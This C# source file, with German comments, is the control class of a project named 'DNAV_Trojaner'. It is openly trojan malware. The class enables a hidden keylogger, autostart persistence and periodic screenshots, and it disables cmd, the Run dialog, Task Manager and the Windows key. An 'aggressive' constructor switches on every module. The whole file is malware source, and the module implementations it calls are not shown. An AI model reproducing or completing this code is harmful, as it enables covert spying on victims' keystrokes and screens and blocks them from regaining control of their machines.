﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace DNAV_Trojaner
{
    public class DNAV
    {
        private bool _keyloggerAndHide;
        private string _keyloggerLogPath;
        private bool _autostart;
        private bool _screenshots;
        private string _screenshotsPath;
        private int _screenshotsInterval;
        private bool _disableCmd;
        private bool _disableRun;
        private bool _disableTaskmanager;
        private bool _disableWindowsKey;

        /// <summary>
        /// Legt fest, ob die Keylogger Funktion aktiviert und das Konsolenfenster versteckt wird.
        /// </summary>
        public bool KeyloggerAndHide
        {
            get
            {
                return this._keyloggerAndHide;
            }
            set
            {
                this._keyloggerAndHide = value;
            }
        }

        public string KeyloggerLogPath
        {
            get
            {
                return this._keyloggerLogPath;
            }
            set
            {
                this._keyloggerLogPath = value != "" ? value : "log.txt";
            }
        }

        public bool Autostart
        {
            get
            {
                return this._autostart;
            }
            set
            {
                this._autostart = value;
            }
        }

        /// <summary>
        /// Legt fest, ob die Screenshot Funktion aktiviert wird.
        /// </summary>
        public bool Screenshots
        {
            get
            {
                return this._screenshots;
            }
            set
            {
                this._screenshots = value;
            }
        }

        public string ScreenshotsPath
        {
            get
            {
                return this._screenshotsPath;
            }
            set
            {
                this._screenshotsPath = value != "" ? value : "screen.png";
            }
        }

        /// <summary>
        /// Legt fest, in welchem Interval die Screenshots der Screenshot Funktion erstellt werden. Die Screenshot Funktion muss aktiviert sein, damit diese Eigenschaft Wirkung zeigt.
        /// </summary>
        public int ScreenshotsInterval
        {
            get
            {
                return this._screenshotsInterval;
            }
            set
            {
                this._screenshotsInterval = value >= 1 ? value : 1;
            }
        }

        /// <summary>
        /// Legt fest, ob die Konsole deaktiviert werden soll.
        /// </summary>
        public bool DisableCmd
        {
            get
            {
                return this._disableCmd;
            }
            set
            {
                this._disableCmd = value;
            }
        }

        /// <summary>
        /// Legt fest, ob der Ausführen-Dialog deaktiviert werden soll.
        /// </summary>
        public bool DisableRun
        {
            get
            {
                return this._disableRun;
            }
            set
            {
                this._disableRun = value;
            }
        }

        /// <summary>
        /// Legt fest, ob der Taskmanager deaktiviert werden soll.
        /// </summary>
        public bool DisableTaskmanager
        {
            get
            {
                return this._disableTaskmanager;
            }
            set
            {
                this._disableTaskmanager = value;
            }
        }

        /// <summary>
        /// Legt fest, ob die Windows Taste deaktiviert werden soll. Ein Klick auf das Startmenü öffnet dieses jedoch immernoch.
        /// </summary>
        public bool DisableWindowsKey
        {
            get
            {
                return this._disableWindowsKey;
            }
            set
            {
                this._disableWindowsKey = value;
            }
        }

        /// <summary>
        /// Erstellt ein Objekt der DNAV Klasse mit Standardparametern.
        /// </summary>
        public DNAV()
        {
            this.KeyloggerAndHide = false;
            this.KeyloggerLogPath = "log.txt";
            this.Screenshots = false;
            this.ScreenshotsPath = "screen.png";
            this.ScreenshotsInterval = 180;
            this.DisableCmd = false;
            this.DisableRun = false;
            this.DisableTaskmanager = false;
            this.DisableWindowsKey = false;
        }

        /// <summary>
        /// Erstellt ein Objekt der DNAV Klasse mit festgelegten Parametern.
        /// </summary>
        /// <param name="aggressive">Wenn gesetzt, sind alle Module aktiviert.</param>
        public DNAV(bool aggressive)
        {
            this.KeyloggerAndHide = true;
            this.KeyloggerLogPath = "log.txt";
            this.Screenshots = aggressive;
            this.ScreenshotsPath = "screen.png";
            this.ScreenshotsInterval = 10;
            this.DisableCmd = aggressive;
            this.DisableRun = aggressive;
            this.DisableTaskmanager = aggressive;
            this.DisableWindowsKey = aggressive;
        }

        public void Start()
        {
            if (this.KeyloggerAndHide)
            {
                Thread keylogger = new Thread(Keylogger.Enable);
                keylogger.Start();
            }
            if (this.Autostart)
            {
                Startup.EnableForAdmin();
            }
            if (this.Screenshots)
            {
                ScreenCapture sc = new ScreenCapture();
                Thread screenshot = new Thread(() => sc.CaptureScreenToFile(this.ScreenshotsPath, System.Drawing.Imaging.ImageFormat.Png, this.ScreenshotsInterval));
                screenshot.Start();
            }
            if (this.DisableCmd)
            {
                Cmd.Disbable();
            }
            if (this.DisableRun)
            {
                Run.Disbable(); 
            }
            if (this.DisableTaskmanager)
            {
                Taskmanager.Disable();
            }
            if (this.DisableWindowsKey)
            {
                WindowsKey.Disable();
            }
        }
    }
}